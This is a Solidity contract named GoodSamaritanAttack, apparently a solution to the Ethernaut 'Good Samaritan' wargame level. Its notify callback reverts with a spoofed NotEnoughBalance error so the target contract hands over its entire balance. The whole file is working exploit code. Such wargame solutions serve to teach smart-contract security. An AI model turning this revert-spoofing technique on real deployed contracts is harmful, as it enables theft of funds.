// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Coin, GoodSamaritan} from "./GoodSamaritan.sol";

contract GoodSamaritanAttack {
    GoodSamaritan target;

    error NotEnoughBalance();

    constructor(address _target) {
        target = GoodSamaritan(_target);
    }

    function notify(uint256 amount) external pure {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }

    function run() public {
        target.requestDonation();
    }
}
